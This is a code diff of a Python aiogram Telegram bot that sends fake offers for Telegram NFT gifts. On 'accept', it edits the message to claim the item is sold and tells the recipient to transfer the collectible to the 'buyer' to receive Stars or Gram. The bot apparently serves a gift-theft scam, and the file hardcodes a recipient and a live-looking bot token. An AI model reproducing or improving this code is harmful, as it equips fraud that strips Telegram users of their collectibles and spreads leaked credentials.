@@ -8,7 +8,6 @@ from aiogram.enums import ParseMode
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.exceptions import TelegramRetryAfter
 
-# Настройки
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
 RECIPIENT = "@recipient_username"
 
@@ -58,16 +57,12 @@ LOCALES = {
 def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
     slug = gift_name.replace(" ", "")
     loc = LOCALES.get(lang, LOCALES["ru"])
-    
-    if currency_type.lower() == "gram":
-        emoji_id = "5298988357538328017"
-        fallback_char = "💎"
-    else:
-        emoji_id = "5258165702707125574"
-        fallback_char = "⭐️"
 
-    currency_emoji = f'<tg-emoji emoji-id="{emoji_id}">{fallback_char}</tg-emoji>'
-    
+    if currency_type.lower() == "gram":
+        currency_emoji = '<tg-emoji emoji-id="5298988357538328017">💎</tg-emoji>'
+    else:
+        currency_emoji = '<tg-emoji emoji-id="5920433463428650761">⭐️</tg-emoji>'
+
     return loc["offer_text"].format(
         amount=amount,
         currency_emoji=currency_emoji,
@@ -128,7 +123,7 @@ async def handle_business_command(message: Message):
         return
 
     text_lower = text_clean.lower()
-    
+
     if "gram" in text_lower:
         currency_type = "gram"
         currency_name = "Gram"
@@ -182,20 +177,18 @@ async def accept_offer(cb: CallbackQuery):
 
     _, slug, gift_num_str, amount, currency_type, lang = parts
     gift_num = int(gift_num_str)
-    
+
     currency_name = "Gram" if currency_type.lower() == "gram" else "Stars"
-    
-    # ==========================================
-    # И ТУТ ТЫ МОЖЕШЬ ИЗМЕНИТЬ ТЕКСТ НА СООБЩЕНИЕ КОТОРОЕ ХОЧЕШЬ:
-    # ==========================================
-    success_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
+
+    gift_name_display = slug.replace("-", " ")
+    gift_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
     text = (
-        f"{success_emoji} <b>Предмет #{gift_num} успешно продан!</b>\n\n"
-        f"<b>• Передайте покупателю для зачисления {currency_name}.</b>\n"
+        f"{gift_emoji} <b>Коллекционный предмет: "
+        f"<a href=\"https://t.me/nft/{slug}-{gift_num}\">{slug}-{gift_num}</a> успешно продан!</b>\n\n"
+        f"• Передайте коллекционный предмет покупателю для зачисления {currency_name}.\n"
         f"\u200B"
     )
-    # ==========================================
-    
+
     chat_id = cb.message.chat.id
     message_id = cb.message.message_id
     bcid = cb.message.business_connection_id
@@ -204,7 +197,6 @@ async def accept_offer(cb: CallbackQuery):
 
     success = False
 
-    # Способ 1: Обычное редактирование
     try:
         await bot.edit_message_text(
             chat_id=chat_id,
@@ -218,7 +210,6 @@ async def accept_offer(cb: CallbackQuery):
     except Exception:
         pass
 
-    # Способ 2: Редактирование через Business Connection ID
     if not success and bcid:
         try:
             await bot.edit_message_text(
